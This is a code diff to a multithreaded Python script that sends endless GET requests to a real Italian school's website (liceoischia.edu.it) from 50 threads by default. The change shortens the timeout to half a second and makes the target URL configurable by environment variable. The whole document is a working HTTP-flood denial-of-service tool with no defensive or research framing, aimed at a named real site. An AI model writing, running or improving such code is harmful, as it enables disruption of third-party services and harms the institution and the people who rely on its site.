@@ -2,7 +2,8 @@ import requests, threading, time, os
 
 I=0
 nThreads = int(os.environ.get("THREADS", "50"))
-TIMEOUT = int(os.environ.get("TIMEOUT", "20"))
+TIMEOUT = float(os.environ.get("TIMEOUT", "0.5"))
+LINK = os.environ.get("LINK", "https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01")
 
 threads = []
 
@@ -13,17 +14,17 @@ def do_request_hv():
     while True:
         t1 = time.time()
         try:
-            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
+            requests.get(LINK, timeout=TIMEOUT)
         except:
             pass
         I=I+1
-        print(f'Req n:{I} took: {time.time() - t1} s')
+        print('Req n:{0} took: {1:.5f} s'.format(I, time.time() - t1))
 
 def do_request_nhv():
     global I
     while True:
         try:
-            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
+            requests.get(LINK, timeout=TIMEOUT)
         except:
             pass
         I=I+1
